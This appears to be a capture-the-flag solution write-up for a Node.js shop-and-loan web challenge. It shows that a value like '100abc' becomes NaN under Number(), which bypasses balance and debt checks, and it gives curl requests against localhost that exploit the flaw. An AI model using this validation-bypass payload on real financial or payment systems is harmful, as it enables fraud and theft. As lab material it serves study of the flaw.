# Solution
```javascript 
// ParseInt() and Number() have different behaviors 
parseInt("10abc") => 10
Number("10abc") => NaN

// Using this fact, we can byass the following check:
req.session.user.money < Number(amount) 

req.session.user.debtAmount < Number(amount)

Number("100abc") => NaN
req.session.user.debtAmount < NaN => false
req.session.user.money < NaN => false

```

## Borrow gold
```bash
curl http://localhost:3000/borrow?amount=100
```

## Buy Swampshade Serum
```bash
curl http://localhost:3000/buy?id=4
```

# Repay the loan
```bash
curl http://localhost:3000/repay?amount=100abc
```